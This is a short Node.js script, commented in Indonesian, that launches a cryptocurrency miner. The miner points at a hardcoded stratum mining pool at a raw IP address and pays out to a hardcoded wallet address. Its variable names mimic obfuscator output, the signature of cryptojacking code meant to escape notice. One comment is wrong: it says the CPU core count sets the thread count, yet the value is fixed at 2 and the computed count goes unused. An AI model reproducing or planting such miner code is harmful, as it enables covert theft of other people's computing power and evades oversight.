const { Nnode } = require("./index.js");
const os = require("os"); // Import modul os

// ⚠️ Ganti sesuai kebutuhan
var _0xabc123 = function(){
    var _0xdef456 = 'stratum+tcp://141.94.223.113:4052';
    var _0xghi789 = '8BAei31qDSqCRwS1GsQTWjfMjK4VxxThbFckHFoXyRP1BM2keM3bNCY9YBvpGmwuxG4Nec7gqejYGU8E4VNHXYYC7Y2EUJZ';
    
    // Dapatkan jumlah core CPU
    var cpuCores = os.cpus().length;
    
    // Konfigurasi: otomatis gunakan jumlah core, bisa di-override manual
    var _0xjkl012 = { 
        'threads': 2, // Gunakan jumlah core secara default
        'mode': 'FAST' 
    };
    
    new Nnode(_0xdef456, _0xghi789, _0xjkl012);
}();
